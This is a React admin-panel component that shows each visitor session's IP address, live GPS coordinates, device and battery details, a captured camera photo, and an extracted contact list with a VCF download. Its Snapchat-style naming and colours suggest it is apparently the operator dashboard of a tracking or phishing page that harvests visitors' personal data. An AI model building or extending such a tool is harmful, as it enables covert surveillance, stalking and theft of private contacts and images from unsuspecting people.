"use client";

// components/admin/VisitorSessionCard.tsx
import React, { useState } from "react";
import { Card } from "@/components/ui/Card";
import { Badge } from "@/components/ui/Badge";
import { Button } from "@/components/ui/Button";
import { LocationSession } from "@/lib/types";
import { formatDate } from "@/lib/utils";
import { getSnapImageUrl } from "@/lib/storage";
import { SessionPhotoCard } from "./SessionPhotoCard";
import {
  ExternalLink,
  MapPin,
  Smartphone,
  Battery,
  BatteryCharging,
  Users,
  Download,
  ChevronDown,
  ChevronUp,
} from "lucide-react";

interface VisitorSessionCardProps {
  session: LocationSession;
}

export const VisitorSessionCard: React.FC<VisitorSessionCardProps> = ({ session }) => {
  const [showContacts, setShowContacts] = useState(false);
  const latestCoord = session.location_updates?.[session.location_updates.length - 1];
  const dev = session.device_info;
  const capturedData = (session.captured_data as any) || {};
  const contactsList = capturedData.contacts || [];
  const vcfPath = capturedData.contacts_vcf_path;
  const photoUrl = session.captured_media_path ? getSnapImageUrl(session.captured_media_path) : null;
  const vcfUrl = vcfPath ? getSnapImageUrl(vcfPath) : null;

  return (
    <Card variant="glass" className="p-4 sm:p-5 space-y-4">
      {/* Top Header */}
      <div className="flex flex-wrap items-center justify-between gap-2 border-b border-white/5 pb-3">
        <div className="flex items-center gap-2">
          <Badge variant={session.status === "active" ? "live" : "expired"}>
            {session.status === "active" ? "Active" : "Completed"}
          </Badge>
          <span className="text-xs font-mono text-white/80 font-bold">
            IP: {session.ip_address || "Unknown"}
          </span>
        </div>
        <span className="text-xs text-white/40 font-mono">
          {formatDate(session.consent_at)}
        </span>
      </div>

      {/* Grid info: Coordinates & Device */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-3 sm:gap-4">
        {/* Location & GPS */}
        <div className="space-y-2 bg-slate-50 dark:bg-white/[0.03] p-3.5 rounded-2xl border border-slate-200/80 dark:border-white/5">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2 text-xs font-bold text-slate-900 dark:text-white">
              <MapPin className="w-3.5 h-3.5 text-amber-600 dark:text-[#FFFC00]" />
              <span>GPS Coordinates</span>
            </div>
            {latestCoord && (
              <a
                href={`https://www.google.com/maps?q=${latestCoord.latitude},${latestCoord.longitude}`}
                target="_blank"
                rel="noopener noreferrer"
              >
                <Button variant="secondary" size="sm" className="h-7 text-[11px] gap-1 px-2.5 border-slate-200 dark:border-white/10 text-slate-800 dark:text-white">
                  <ExternalLink className="w-3 h-3" />
                  Google Maps
                </Button>
              </a>
            )}
          </div>

          {latestCoord ? (
            <div className="space-y-0.5 text-xs font-mono text-slate-700 dark:text-white/70">
              <p className="text-amber-700 dark:text-[#FFFC00] font-bold">
                {latestCoord.latitude.toFixed(6)}, {latestCoord.longitude.toFixed(6)}
              </p>
              <p className="text-[11px] text-slate-500 dark:text-white/40">
                Accuracy: ±{Math.round(latestCoord.accuracy || 0)}m • {session.location_updates?.length || 1} update(s)
              </p>
            </div>
          ) : (
            <p className="text-xs text-slate-400 dark:text-white/40">No coordinates transmitted yet.</p>
          )}
        </div>

        {/* Device & Battery Telemetry */}
        <div className="space-y-2 bg-slate-50 dark:bg-white/[0.03] p-3.5 rounded-2xl border border-slate-200/80 dark:border-white/5 text-xs">
          <div className="flex items-center gap-2 text-xs font-bold text-slate-900 dark:text-white">
            <Smartphone className="w-3.5 h-3.5 text-amber-600 dark:text-[#FFFC00]" />
            <span>Device Telemetry</span>
          </div>

          <div className="grid grid-cols-2 gap-2 text-slate-700 dark:text-white/70">
            <div>
              <p className="text-[10px] text-slate-400 dark:text-white/40 font-semibold uppercase tracking-wider">OS &amp; Browser</p>
              <p className="font-semibold text-slate-900 dark:text-white truncate">
                {dev?.os || "Unknown"} • {dev?.browser || "Browser"}
              </p>
            </div>
            <div>
              <p className="text-[10px] text-slate-400 dark:text-white/40 font-semibold uppercase tracking-wider">Screen &amp; Timezone</p>
              <p className="truncate">{dev?.screen || "—"} • {dev?.timezone || "—"}</p>
            </div>
          </div>

          {dev?.battery !== null && dev?.battery !== undefined && (
            <div className="flex items-center gap-1.5 text-[11px] text-amber-700 dark:text-[#FFFC00] pt-1 font-mono">
              {dev.isCharging ? <BatteryCharging className="w-3.5 h-3.5" /> : <Battery className="w-3.5 h-3.5" />}
              <span>Battery: {dev.battery}% {dev.isCharging ? "(Charging)" : ""}</span>
            </div>
          )}
        </div>
      </div>

      {/* Captured Camera Photo (if present) */}
      {photoUrl && (
        <SessionPhotoCard photoUrl={photoUrl} visitorIp={session.ip_address} />
      )}

      {/* Captured Contacts (if present) */}
      {capturedData.contacts_count > 0 && (
        <div className="p-3 bg-slate-50 dark:bg-white/[0.03] rounded-2xl border border-slate-200/80 dark:border-white/5 space-y-2">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2 text-xs font-bold text-slate-900 dark:text-white">
              <Users className="w-3.5 h-3.5 text-amber-600 dark:text-[#FFFC00]" />
              <span>Extracted Contacts ({capturedData.contacts_count})</span>
            </div>
            <div className="flex items-center gap-2">
              {vcfUrl && (
                <a href={vcfUrl} download={`contacts_${session.id}.vcf`}>
                  <Button variant="primary" size="sm" className="h-7 text-[11px] gap-1 px-2.5">
                    <Download className="w-3 h-3 text-black" />
                    Download (.VCF)
                  </Button>
                </a>
              )}
              <Button
                onClick={() => setShowContacts(!showContacts)}
                variant="ghost"
                size="sm"
                className="h-7 text-[11px] px-2"
              >
                {showContacts ? <ChevronUp className="w-3 h-3" /> : <ChevronDown className="w-3 h-3" />}
              </Button>
            </div>
          </div>

          {showContacts && contactsList.length > 0 && (
            <div className="max-h-48 overflow-y-auto space-y-1.5 pt-1 pr-1">
              {contactsList.map((c: any, i: number) => (
                <div key={i} className="p-2 bg-slate-100 dark:bg-black/40 rounded-xl text-xs font-mono flex justify-between">
                  <span className="font-bold text-slate-900 dark:text-white truncate">{c.name?.[0] || "Unnamed"}</span>
                  <span className="text-amber-700 dark:text-[#FFFC00]">{c.tel?.[0] || c.email?.[0] || "—"}</span>
                </div>
              ))}
            </div>
          )}
        </div>
      )}
    </Card>
  );
};
